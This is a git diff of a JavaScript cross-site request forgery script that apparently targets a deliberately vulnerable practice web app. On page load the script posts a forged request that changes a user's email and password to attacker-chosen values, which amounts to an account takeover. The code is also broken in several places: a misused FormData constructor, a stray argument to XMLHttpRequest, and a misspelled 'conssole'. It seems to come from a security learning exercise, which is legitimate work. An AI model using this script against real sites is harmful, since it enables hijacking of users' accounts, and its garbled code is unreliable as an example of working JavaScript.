@@ -3,15 +3,26 @@ window.addEventListener("DOMContentLoaded", () => {
   // const form = iframe.contentWindow.document.querySelector('#csrf-form');
   const form = document.querySelector('#csrf-form');
 
-  const formData = new FormData(document.getElementById("csrf-form"));
-  const XHR = new XMLHttpRequest();
-    XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/4", true);
+
+//   const formObj = `<form action="https://vulnerable-app1.herokuapp.com/customers/edit" method="post" id="csrf-form" >
+//   <input type="hidden" name="customer[email]" value="top@gun" />
+//   <input type="hidden" name="customer[password]" value="tomcruise" />
+//   <input type="hidden" name="customer[password_confirmation]" value="tomcruise" />
+// </form>`;
+
+  const customer = {
+    email: "top@gun",
+    password: "tomcruise",
+    password_confirmation: "tomcruise"
+  };
+
+  const formData = new FormData(customer);
+  const XHR = new XMLHttpRequest(formData);
+    XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/edit", true);
     XHR.responseType = "json";
     XHR.send(formData);
     XHR.onload = () => {
       conssole.log("ok")
-      location.href="https://kotonekurita.github.io/VulnerableApp/"
-      return null
     }
   // form.submit()
 })
